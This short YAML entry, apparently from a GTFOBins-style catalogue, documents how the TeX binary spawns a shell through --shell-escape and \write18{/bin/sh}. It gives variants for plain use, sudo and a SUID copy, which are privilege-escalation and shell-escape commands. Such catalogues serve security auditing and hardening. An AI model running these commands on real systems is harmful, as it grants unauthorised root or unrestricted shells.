---
functions:
  shell:
    - code: |
        tex --shell-escape '\write18{/bin/sh}\end'
  sudo:
    - code: |
        sudo tex --shell-escape '\write18{/bin/sh}\end'
  limited-suid:
    - code: |
        ./tex --shell-escape '\write18{/bin/sh}\end'
---
